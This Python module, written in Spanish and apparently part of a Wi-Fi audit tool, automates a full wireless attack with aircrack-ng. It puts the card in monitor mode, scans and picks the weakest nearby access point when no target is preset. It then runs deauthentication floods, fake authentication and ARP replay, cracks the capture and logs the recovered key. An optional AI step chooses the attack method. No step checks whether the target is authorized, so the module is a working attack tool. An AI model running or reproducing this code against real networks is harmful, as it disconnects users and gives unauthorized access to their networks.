"""Orquestador de auditoria Wi-Fi automatica.

Encadena toda la suite aircrack-ng sin intervencion: prepara la interfaz,
escanea, elige objetivo, decide el metodo segun el AP (con IA opcional),
captura, ataca si hace falta, crackea y deja la informacion lista para el
informe.

Diseno: no importa Textual. Recibe callbacks (``on_log``, ``on_event``) y un
predicado ``should_stop`` para poder probar el nucleo o reutilizarlo en una
CLI o una API, igual que el resto de ``wifi_audit/core``.
"""

from __future__ import annotations

import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Callable

from ..config import now_iso
from . import ai, attacks, cracker, interface, scanner
from .runner import CommandError, ManagedProcess, run_blocking

# --------------------------------------------------------------------------- plan
# Enfoques de ataque y como se materializan.
APPROACH_PMKID = "pmkid"
APPROACH_HANDSHAKE = "handshake"
APPROACH_WEP = "wep"
APPROACH_OPEN = "open"
APPROACH_UNSUPPORTED = "unsupported"


@dataclass
class MethodPlan:
    approach: str
    rationale: str = ""
    steps: list[str] = field(default_factory=list)
    source: str = "determinista"

    def as_dict(self) -> dict:
        return asdict(self)


def fingerprint(ap: scanner.AccessPoint, clients: list[scanner.Client]) -> dict:
    """Resumen del AP que se envia a la IA (sin datos personales)."""
    return {
        "bssid": ap.bssid,
        "essid": ap.display_essid,
        "channel": ap.channel,
        "encryption": ap.encryption,
        "privacy": ap.privacy,
        "cipher": ap.cipher,
        "auth": ap.auth,
        "power": ap.power,
        "clients": len(clients),
    }


def deterministic_plan(ap: scanner.AccessPoint,
                       clients: list[scanner.Client]) -> MethodPlan:
    """Tabla de decision: elige el metodo segun el tipo de red."""
    enc = ap.encryption.upper()

    if enc == "WEP":
        return MethodPlan(
            approach=APPROACH_WEP,
            rationale="Red WEP: se generan IVs con fakeauth + ARP replay para "
                      "recuperar la clave por criptoanalisis de IVs.",
            steps=["capturar en el canal del AP",
                   "aireplay-ng --fakeauth 0",
                   "aireplay-ng --arpreplay (generar IVs)",
                   "aircrack-ng sobre el .cap (sin diccionario)"],
        )

    if enc.startswith("WPA3") or "SAE" in (ap.auth or "").upper():
        return MethodPlan(
            approach=APPROACH_UNSUPPORTED,
            rationale="WPA3/SAE no es atacable por diccionario con este flujo. "
                      "Se documenta como hallazgo (cifrado moderno).",
            steps=["documentar como hallazgo"],
        )

    if enc == "ABIERTA":
        return MethodPlan(
            approach=APPROACH_OPEN,
            rationale="Red abierta: no hay clave que recuperar. Se documenta.",
            steps=["documentar red abierta y riesgos"],
        )

    # WPA / WPA2 (PSK)
    if clients:
        return MethodPlan(
            approach=APPROACH_HANDSHAKE,
            rationale=f"WPA/WPA2 con {len(clients)} cliente(s): captura del "
                      "handshake de 4 vias forzando reconexion con deauth.",
            steps=["capturar en el canal del AP",
                   "aireplay-ng --deauth sobre un cliente",
                   "detectar EAPOL/handshake",
                   "aircrack-ng con diccionario"],
        )
    return MethodPlan(
        approach=APPROACH_PMKID,
        rationale="WPA/WPA2 sin clientes visibles: se intenta PMKID "
                  "(client-less) antes de forzar deauth.",
        steps=["capturar en el canal del AP", "detectar PMKID",
               "aircrack-ng con diccionario"],
    )


def choose_plan(ap: scanner.AccessPoint, clients: list[scanner.Client],
                use_ai: bool, on_log: Callable[[str], None]) -> MethodPlan:
    """Plan final: IA (validada) con respaldo determinista."""
    fallback = deterministic_plan(ap, clients)
    if not use_ai or not ai.available():
        return fallback
    try:
        data = ai.plan_target(
            fingerprint(ap, clients),
            [{"mac": c.mac, "power": c.power, "bssid": c.bssid} for c in clients],
            fallback.as_dict(),
        )
    except ai.AIError as exc:
        on_log(f"[ia] sin recomendacion ({exc}); uso plan determinista.")
        return fallback

    plan = MethodPlan(
        approach=data["approach"],
        rationale=data.get("rationale") or fallback.rationale,
        steps=data.get("steps") or fallback.steps,
        source="ia",
    )
    on_log(f"[ia] enfoque sugerido: {plan.approach} ({plan.rationale})")
    return plan


# --------------------------------------------------------------------------- auditor
class AutoAuditor:
    """Ejecuta el flujo completo y devuelve un resumen de la sesion."""

    def __init__(
        self,
        session_dir: Path,
        *,
        iface: str | None = None,
        monitor_iface: str | None = None,
        target_bssid: str | None = None,
        wordlist: str | None = None,
        scan_seconds: int = 30,
        capture_seconds: int = 60,
        use_ai: bool = True,
        deauth_count: int = 10,
        on_log: Callable[[str], None] | None = None,
        on_event: Callable[[str], None] | None = None,
        should_stop: Callable[[], bool] | None = None,
    ) -> None:
        self.session_dir = Path(session_dir)
        self.iface = iface
        self.monitor_iface = monitor_iface
        self.target_bssid = target_bssid
        self.wordlist = wordlist
        self.scan_seconds = scan_seconds
        self.capture_seconds = capture_seconds
        self.use_ai = use_ai
        self.deauth_count = deauth_count

        self._log = on_log or (lambda _m: None)
        self._event = on_event or (lambda _m: None)
        self._should_stop = should_stop or (lambda: False)

        self.procs: dict[str, ManagedProcess] = {}
        self._created_monitor = False
        self.result: dict = {}

    # ------------------------------------------------------------- utilidades
    def log(self, msg: str) -> None:
        self._log(msg)

    def event(self, msg: str) -> None:
        self._event(f"{now_iso()}  {msg}")

    def stop(self) -> None:
        for proc in list(self.procs.values()):
            try:
                proc.stop()
            except Exception:  # noqa: BLE001
                pass
        self.procs.clear()

    def _stopped(self) -> bool:
        return self._should_stop()

    def _sleep(self, seconds: float) -> None:
        """Espera interrumpible de ``seconds`` vigilar el flag de parada."""
        end = time.time() + seconds
        while time.time() < end:
            if self._stopped():
                return
            time.sleep(0.3)

    def _start(self, key: str, argv: list[str], log: Path) -> ManagedProcess | None:
        try:
            proc = ManagedProcess(argv, log_file=log).start()
        except CommandError as exc:
            self.log(f"[error] {exc}")
            return None
        self.procs[key] = proc
        self.log(f"$ {' '.join(str(a) for a in argv)}")
        return proc

    def _stop_proc(self, key: str) -> None:
        proc = self.procs.pop(key, None)
        if proc:
            proc.stop()

    def _read_log(self, path: Path) -> str:
        try:
            return path.read_text(encoding="utf-8", errors="replace")
        except OSError:
            return ""

    # ------------------------------------------------------------------- flujo
    def run(self) -> dict:
        try:
            self._prepare_interface()
            if self._stopped():
                return self._finish(aborted=True)

            aps, clients = self._scan()
            if self._stopped():
                return self._finish(aborted=True)
            if not aps:
                self.log("[auto] no se descubrieron APs; abortando.")
                return self._finish(aborted=True)

            target = self._pick_target(aps, clients)
            plan = choose_plan(target, clients.get(target.bssid, []),
                               self.use_ai, self.log)
            self.result["target"] = fingerprint(
                target, clients.get(target.bssid, []))
            self.result["plan"] = plan.as_dict()
            self.log(f"[auto] objetivo: {target.display_essid} ({target.bssid}) "
                     f"canal {target.channel} -> plan {plan.approach} "
                     f"[{plan.source}]")

            capfile = self._execute_plan(target, clients, plan)
            if capfile and not self._stopped():
                self._crack(capfile, target, plan)

            return self._finish()
        except Exception as exc:  # noqa: BLE001
            self.log(f"[auto] error inesperado: {exc}")
            self.event(f"Error en flujo automatico: {exc}")
            return self._finish(error=str(exc))
        finally:
            self.stop()
            self._restore_interface()

    # -- 1. interfaz -------------------------------------------------------
    def _prepare_interface(self) -> None:
        self.log("[auto] comprobando entorno ...")
        missing = [n for n in ("airmon-ng", "airodump-ng", "aireplay-ng",
                               "aircrack-ng") if not interface.is_available(n)]
        if missing:
            raise CommandError(f"faltan herramientas de la suite: {missing}")

        if self.monitor_iface:
            self.log(f"[auto] ya hay monitor: {self.monitor_iface}")
            return

        iface = self.iface
        if not iface:
            wireless = [w for w in interface.list_wireless_interfaces()
                        if not interface.is_monitor(w)]
            if not wireless:
                raise CommandError("no hay interfaz inalambrica disponible")
            iface = wireless[0]
        self.log(f"[auto] interfaz elegida: {iface}")

        self.log("[auto] airmon-ng check kill ...")
        try:
            interface.check_kill()
        except Exception as exc:  # noqa: BLE001
            self.log(f"[auto] check kill aviso: {exc}")

        mon = interface.start_monitor(iface)
        if not mon:
            raise CommandError(f"no se pudo activar modo monitor en {iface}")
        self.iface = iface
        self.monitor_iface = mon
        self._created_monitor = True
        self.event(f"Modo monitor activado por flujo automatico: {iface} -> {mon}")

    def _restore_interface(self) -> None:
        if self._created_monitor and self.monitor_iface:
            try:
                interface.stop_monitor(self.monitor_iface)
                self.event(f"Modo monitor desactivado: {self.monitor_iface}")
            except Exception:  # noqa: BLE001
                pass

    # -- 2. escaneo --------------------------------------------------------
    def _scan(self) -> tuple[dict, dict]:
        self.log(f"[auto] escaneando {self.scan_seconds}s ...")
        prefix = self.session_dir / "auto-scan"
        log = self.session_dir / "auto-scan.stdout.log"
        argv = attacks.scan_argv(self.monitor_iface, prefix)
        if self._start("scan", argv, log) is None:
            return {}, {}
        self.event("Escaneo automatico iniciado")
        self._sleep(self.scan_seconds)
        self._stop_proc("scan")

        csv_path = scanner.latest_csv(prefix)
        if not csv_path:
            return {}, {}
        aps, cl_map = scanner.parse_airodump_csv(csv_path)
        self.log(f"[auto] descubiertos {len(aps)} APs y {len(cl_map)} clientes")
        self.result["aps"] = [fingerprint(ap, []) for ap in aps.values()]
        # Reindexa clientes por BSSID del AP.
        by_ap: dict[str, list[scanner.Client]] = {}
        for cl in cl_map.values():
            if cl.bssid:
                by_ap.setdefault(cl.bssid, []).append(cl)
        return aps, by_ap

    # -- 3. objetivo -------------------------------------------------------
    def _pick_target(self, aps: dict, clients: dict) -> scanner.AccessPoint:
        # El operador puede haber fijado uno desde la pestana Escaneo.
        preset = self.target_bssid
        if preset and preset in aps:
            return aps[preset]

        ranking = {
            APPROACH_WEP: 0,
            APPROACH_HANDSHAKE: 1,
            APPROACH_PMKID: 2,
            APPROACH_OPEN: 3,
            APPROACH_UNSUPPORTED: 4,
        }

        def score(ap: scanner.AccessPoint) -> tuple:
            plan = deterministic_plan(ap, clients.get(ap.bssid, []))
            try:
                power = int(ap.power)
            except ValueError:
                power = -999
            return (ranking.get(plan.approach, 9), -power)

        return sorted(aps.values(), key=score)[0]

    # -- 4. ejecucion del plan --------------------------------------------
    def _execute_plan(self, ap: scanner.AccessPoint, clients: dict,
                      plan: MethodPlan) -> Path | None:
        approach = plan.approach
        if approach in (APPROACH_OPEN, APPROACH_UNSUPPORTED):
            self.log(f"[auto] {approach}: no se ejecutan ataques activos. "
                     f"{plan.rationale}")
            self.result["outcome"] = approach
            return None

        if approach == APPROACH_PMKID:
            return self._capture(ap, clients, deauth=False, want="pmkid")
        if approach == APPROACH_HANDSHAKE:
            return self._capture(ap, clients, deauth=True, want="handshake")
        if approach == APPROACH_WEP:
            return self._wep(ap, clients)
        return None

    def _capture(self, ap: scanner.AccessPoint, clients: dict, *,
                 deauth: bool, want: str) -> Path | None:
        prefix = self.session_dir / "auto-capture"
        log = self.session_dir / "auto-capture.stdout.log"
        argv = attacks.capture_argv(self.monitor_iface, prefix,
                                    bssid=ap.bssid, channel=ap.channel)
        if self._start("capture", argv, log) is None:
            return None
        self.event(f"Captura automatica sobre {ap.bssid} (canal {ap.channel})")

        if deauth:
            self._sleep(3)
            client = (clients.get(ap.bssid) or [None])[0]
            mac = client.mac if client else None
            dargv = attacks.deauth_argv(self.monitor_iface, ap.bssid, mac,
                                        self.deauth_count)
            self.log(f"$ {' '.join(str(a) for a in dargv)}")
            self.event(f"Deauth automatico x{self.deauth_count} -> {ap.bssid}"
                       + (f" (cliente {mac})" if mac else ""))
            try:
                run_blocking(dargv, timeout=20)
            except Exception as exc:  # noqa: BLE001
                self.log(f"[auto] deauth aviso: {exc}")

        found = False
        waited = 0.0
        while waited < self.capture_seconds and not self._stopped():
            self._sleep(2)
            waited += 2
            content = self._read_log(log)
            if want == "pmkid" and ("PMKID" in content.upper()):
                found = True
                break
            if want == "handshake" and ("WPA handshake:" in content
                                        or "handshake(s) captured" in content):
                found = True
                break

        self._stop_proc("capture")
        capfile = self._latest_cap(prefix)
        if found:
            self.log(f"[auto] {want} detectado -> {capfile}")
            self.event(f"{want} capturado ({capfile.name if capfile else '?'})")
            self.result["outcome"] = want
        else:
            self.log(f"[auto] no se detecto {want} en {self.capture_seconds}s")
            self.result["outcome"] = f"{want}_no_capturado"
        return capfile

    def _wep(self, ap: scanner.AccessPoint, clients: dict) -> Path | None:
        prefix = self.session_dir / "auto-capture"
        log = self.session_dir / "auto-capture.stdout.log"
        argv = attacks.capture_argv(self.monitor_iface, prefix,
                                    bssid=ap.bssid, channel=ap.channel)
        if self._start("capture", argv, log) is None:
            return None
        self._sleep(3)

        source = interface.interface_mac(self.monitor_iface) or ""
        fa = attacks.fakeauth_argv(self.monitor_iface, ap.bssid)
        self.event(f"Fake auth automatico -> {ap.bssid}")
        try:
            run_blocking(fa, timeout=20)
        except Exception as exc:  # noqa: BLE001
            self.log(f"[auto] fakeauth aviso: {exc}")

        if source:
            arp = attacks.arpreplay_argv(self.monitor_iface, ap.bssid, source)
            self.log(f"$ {' '.join(str(a) for a in arp)}")
            self.event(f"ARP replay automatico -> {ap.bssid}")
            self._start("arpreplay", arp, self.session_dir / "auto-arp.stdout.log")

        self._sleep(self.capture_seconds)
        self._stop_proc("arpreplay")
        self._stop_proc("capture")
        capfile = self._latest_cap(prefix)
        self.result["outcome"] = "wep_capturado" if capfile else "wep_sin_datos"
        return capfile

    # -- 5. cracking -------------------------------------------------------
    def _crack(self, capfile: Path, ap: scanner.AccessPoint,
               plan: MethodPlan) -> None:
        wordlist = Path(self.wordlist) if self.wordlist else None
        if plan.approach != APPROACH_WEP:
            if not wordlist or not wordlist.is_file():
                self.log("[auto] sin diccionario valido; se omite el cracking.")
                self.result["crack"] = "omitido_sin_diccionario"
                return
        self.log(f"[auto] cracking {capfile.name} ...")
        argv = cracker.build_aircrack_argv(capfile, wordlist=wordlist,
                                           bssid=ap.bssid)
        if self._start("crack", argv, self.session_dir / "auto-crack.stdout.log") is None:
            return
        proc = self.procs["crack"]
        key: str | None = None
        for line in proc.lines():
            if self._stopped():
                break
            found = cracker.parse_key_found(line)
            if found:
                key = found
                break
        proc.stop()
        self.procs.pop("crack", None)

        self.result["crack"] = ("clave_encontrada" if key else "sin_exito")
        self.result["key"] = key or ""
        if key:
            self.log(f"[auto] CLAVE ENCONTRADA: {key}")
            self.event(f"Clave recuperada para {ap.bssid}: {key}")
        else:
            self.log("[auto] cracking sin exito.")
            self.event("Cracking automatico sin exito")

    # -- helpers -----------------------------------------------------------
    def _latest_cap(self, prefix: Path) -> Path | None:
        caps = scanner.list_capture_files(self.session_dir)
        for c in caps:
            if c.name.startswith(prefix.name):
                return c
        return caps[0] if caps else None

    # -- cierre ------------------------------------------------------------
    def _finish(self, *, aborted: bool = False, error: str | None = None) -> dict:
        self.result["aborted"] = aborted
        self.result["error"] = error or ""
        self.result["finished_at"] = now_iso()

        if self.use_ai and ai.available() and not aborted:
            try:
                self.result["ai_analysis"] = ai.interpret_results(self._summary())
                self.log("[ia] analisis de resultados generado.")
            except ai.AIError as exc:
                self.log(f"[ia] no se pudo interpretar resultados: {exc}")
        return self.result

    def _summary(self) -> dict:
        return {
            "interfaz": self.iface,
            "monitor": self.monitor_iface,
            "objetivo": self.result.get("target"),
            "plan": self.result.get("plan"),
            "resultado": self.result.get("outcome"),
            "cracking": self.result.get("crack"),
            "clave": self.result.get("key", ""),
            "aps_descubiertos": len(self.result.get("aps", [])),
        }
